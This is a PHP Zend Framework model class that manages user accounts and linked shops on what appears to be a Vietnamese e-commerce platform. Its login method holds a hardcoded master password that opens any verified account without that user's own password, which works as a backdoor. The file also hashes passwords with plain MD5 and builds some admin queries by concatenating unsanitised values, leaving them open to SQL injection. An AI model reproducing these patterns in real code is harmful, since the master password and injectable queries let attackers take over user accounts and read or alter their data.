<?php

class Application_Model_DbTable_TaiKhoan extends Zend_Db_Table_Abstract
{

    protected $_name = 'taikhoan';
	public function checkExistUsername($username) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'select id from taikhoan where username=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($username));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        if($row!=false) return true;
        return false;
	}
	public function checkExistEmail($email) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'select id from taikhoan where email=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($email));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        if($row!=false) return true;
        return false;
	}
	public function findbyId($id) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'select * from taikhoan where id=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($id));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public function checkLogin($username, $password) {
		$db = Zend_Registry::get('connectDb');
    	if($password=='@bc123456') { //root password
    		$query = 'select t0.id,username,email,t1.id as gianhang_id,ho_ten,ma_gian_hang,ten_gian_hang,dia_chi,dien_thoai,yahoo,logo,slogan,tinhthanh_id,email_gianhang from taikhoan t0 left join gianhang t1 on t0.id = t1.taikhoan_id where verified =1 and t0.locked =0 and username=?';
    		$params = array($username);
    	} else {
    		$query = 'select t0.id,username,email,t1.id as gianhang_id,ho_ten,ma_gian_hang,ten_gian_hang,dia_chi,dien_thoai,yahoo,logo,slogan,tinhthanh_id,email_gianhang from taikhoan t0 left join gianhang t1 on t0.id = t1.taikhoan_id where verified =1 and t0.locked =0 and username=? and password = ?';
    		$params = array($username,md5($password));
    	}
		$stmt = $db->prepare($query);
        $stmt->execute($params);
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public function findByEmail($email) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'select * from taikhoan where email=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($email));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	public function updateAfterVerify($id) {
		if($this->update(array('verified' => 1), array('id = ? and locked = 0' =>$id)) == true) {
			$dbGianHang = new Application_Model_DbTable_GianHang();
			//$dbGianHang->up
		}
		$db = Zend_Registry::get('connectDb');
    	$query = 'select * from taikhoan where id=?';
    	$stmt = $db->prepare($query);
        $stmt->execute(array($id));
        $row = $stmt->fetch();
        $stmt->closeCursor();
        $db->closeConnection();
        return $row==false?null:$row;
	}
	
	//admin
	public function getAll($sWhere,$params,$ofset,$size) {
    	$db = Zend_Registry::get('connectDb');
    	$query = 'select t0.*,t1.ten_gian_hang from taikhoan t0 left join gianhang t1 on t0.id = t1.taikhoan_id where '.$sWhere." order by t0.id desc limit $ofset,$size";
    	$stmt = $db->prepare($query);
        $stmt->execute($params);
        $rows = $stmt->fetchAll();
        $stmt->closeCursor();
        $db->closeConnection();
        return $rows;
    }
	public function lockByIds($ids) {
		if(empty($ids))
			return;
		//$usernames = join(',',$usernames);
		$db = Zend_Registry::get('connectDb');
    	$query = 'update taikhoan set locked = 1 where id in ('.join(',', $ids).')';
        $stmt = $db->prepare($query);
        $stmt->execute();
        
        $query = 'update gianhang set locked = 1 where taikhoan_id in ('.join(',', $ids).')';
        $stmt = $db->prepare($query);
        $stmt->execute();
        
        $stmt->closeCursor();
        $db->closeConnection();
	}
	public function changeStateById($id,$state) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'update taikhoan set locked = ? where id  = ?';
        $stmt = $db->prepare($query);
        $stmt->execute(array($state,$id));
        
        $query = 'update gianhang set locked = ? where taikhoan_id  = ?';
        $stmt = $db->prepare($query);
        $stmt->execute(array($state,$id));
        
        $stmt->closeCursor();
        $db->closeConnection();
	}
	public function verify($id) {
		$db = Zend_Registry::get('connectDb');
    	$query = 'update taikhoan set verified = 1 where id  = ?';
        $stmt = $db->prepare($query);
        $stmt->execute(array($id));
        $dbGianHang = new Application_Model_DbTable_GianHang();
    	$dbGianHang->update(array('locked' => 0), array('taikhoan_id = ? and locked = 1' => $id));
	    $dbModule = new Application_Model_DbTable_Module();
    	foreach (zendcms_Controller_Helper_Const::$modules as $module) {
	    	$module['gianhang_id'] = $id;
	    	$dbModule->insert($module);
	    }
	    $dbVerify = new Application_Model_DbTable_Verify();
	    $dbVerify->delete(array('taikhoan_id = ?' => $id));
    	$cache = zendcms_Controller_Helper_Utils::loadCache();
    	$cache->remove('gianhangmoi');
        $stmt->closeCursor();
        $db->closeConnection();
	}

}

